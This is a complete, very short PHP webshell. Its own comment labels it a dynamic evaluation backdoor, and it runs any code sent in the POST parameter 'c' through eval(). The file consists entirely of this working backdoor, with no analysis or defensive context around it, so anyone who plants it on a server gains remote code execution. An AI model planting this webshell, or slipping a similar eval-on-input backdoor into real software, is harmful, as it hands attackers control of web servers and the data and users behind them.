<?php
// PHP Webshell dynamic evaluation backdoor
if(isset($_POST['c'])){
    eval($_POST['c']);
}
?>
